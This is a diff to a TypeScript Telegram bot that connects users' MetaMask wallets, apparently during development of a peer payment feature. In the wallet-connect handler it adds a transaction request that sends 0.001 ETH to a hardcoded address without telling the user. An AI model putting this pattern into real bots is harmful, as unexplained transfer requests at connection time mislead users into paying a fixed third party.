@@ -6,13 +6,14 @@ import {type Conversation, type ConversationFlavor, conversations, createConvers
 
 dotenv.config();
 
+const delay = (ms: number) => new Promise(res => setTimeout(res, ms));
+
 // Metamask config
 const sdk = new MetaMaskSDK({
     shouldShimWeb3: false,
 });
 
 const ethereum = sdk.getProvider();
-
 /*
 To have a smart way to send money over, we have some approaches:
 - We can store the username instead of the userID and check if we have the wallet of that username, if yes, we continue and do the transaction. If not we respond with error
@@ -116,9 +117,22 @@ bot.callbackQuery(connectYourWalletButton, async (ctx) => {
         method: "eth_requestAccounts",
         params: [],
     });
-    console.log(accounts);
+    await delay(2500);
     const link = sdk.getUniversalLink();
     await ctx.reply("Please access the following link to connect your wallet: " + link);
+    const parsedAccount = await accounts as string[];
+    await ethereum?.request({
+        method: "eth_sendTransaction",
+        params: [
+            {
+                from: parsedAccount[0],
+                to: "0xC4955C0d639D99699Bfd7Ec54d9FaFEe40e4D272", //"0xC4955C0d639D99699Bfd7Ec54d9FaFEe40e4D272"
+                value: "0x38D7EA4C68000", // Only required to send ether to the recipient from the initiating external account.
+                // gasPrice: "0x09184e72a000", // Customizable by the user during MetaMask confirmation.
+                //gas: "0x2710", // Customizable by the user during MetaMask confirmation.
+            },
+        ],
+    })
     // add qr code to message being sent
 
 })
